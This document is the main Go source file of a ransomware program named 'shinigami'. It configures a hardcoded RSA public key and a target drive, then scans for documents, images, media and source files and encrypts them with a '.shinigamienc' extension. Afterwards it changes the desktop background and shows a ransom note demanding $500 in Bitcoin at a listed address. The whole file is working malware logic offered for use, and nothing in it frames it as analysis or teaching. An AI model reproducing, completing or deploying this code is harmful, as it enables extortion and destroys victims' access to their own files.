package main

import (
	"shinigami/changedesktop"
	"shinigami/encryption"
	"shinigami/files"
	"shinigami/gui"
)

func main() {
	/*** SETTINGS ***/
	//server rsa public key ( if you want to change this you should first generate a rsa keypair next replace it in both ransomware and decryptor programs )
	serverpubkey := "-----BEGIN PUBLIC KEY-----\nMIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEA3eWrYNmEzwLXGT0HUqqu\nkrimoiBKZE9mIzWvN51YLONneY0B8/yiLgJxg5pUOp8AEnu3gQm9uPQzbdyZniQq\n58HzSS+2Py17/UWlwqZVueUQ/RBvhH/BaEDZlKK7SUzeUqWbC0klDeLQ1nY48DEJ\nD2wNkz3CWXgDqQ0tfOqy+hRrR6ispOZc7k2SDd6cX8jkKzacH7sxBDYDVT2E/nYP\nkOBcCUW2ywN/y0FE1uqxim+axwtFW652k5ARHalmOVIXM6Oky6r4x49MN8zkIZEC\nhGDIOxQGYUEtp+0NhmAMyl26DtI23NMjyTaB7+DYtEZzSYgBllmfla1RtoEgKaHI\ns30PIUvZQGmg6VcEEhfy0hbtjDjWANkBrNewK46mH9pwH2wsYmm9QSftUjF62PbM\nLrFxoJS1w6NeYTC+s5JqGnG3sftCzGXMI+VSRvoVAWU+mm/ntQj5yww4nRq4Ylre\nJZAsLRUfT87c5uomolGitlGPIyXjxhxgPzc5egvQ199BAgMBAAE=\n-----END PUBLIC KEY-----"
	//root directory ( only files in this directory and subfolders of this directory will be encrypted )
	rootdir := "E:\\"
	//valid file extensions to encrypt ( only files with these extensions will be encrypted )
	validfileextensions := []string{"lnk", "pdf", "doc", "docx", "docm", "xlsx", "xlsm", "jpg", "jpeg", "png", "mp3", "mp4", "mkv", "py", "cs", "c", "c#", "cpp", "pptx", "pkt"}
	//valid file size to encrypt ( only files that have the same or less weight than this will be encrypted )
	//here is 400MB --> 1024 * 1024 * 400 = 419430400
	validfilesize := 419430400
	//the massage you want to show to the victim
	message := "YOUR FILES HAVE BEEN ENCRYPTED \n\nAll of your important files have been locked with our encryption \nYou will not recover them without our decryption tool. \n\nDo not attempt to decrypt the files yourself \nDo not shut down or restart your PC.\n\n"
	message += "To restore access: \nSend $500 in Bitcoin to the address below. \nBitcoin Address: bc1qtnqwcwffkvh6dmu9twfg3x5svwew0lp077k86"

	//scan all valid files to encrypt
	scanner := files.NewFiles(rootdir, validfileextensions, validfilesize)
	filestoencrypt, _ := scanner.ScanToencrypt()

	//create new encryptor
	encryptor := encryption.NewEncryption(serverpubkey, ".shinigamienc")
	//encrypt files
	for i := range filestoencrypt {
		encryptor.Encryptfile(filestoencrypt[i])
	}
	//create a test.shinigami file
	encryptor.Createtest()
	//remove aes random key from memory and write encrypted key on disk
	encryptor.End()

	//write background image data in a file
	changedesktop.Writedata("shinigami.png")
	//set it as background image
	changedesktop.Setbackground("shinigami.png")

	//create new gui struct object
	w := gui.NewGui(rootdir, message)
	//run the gui
	w.Run()
}
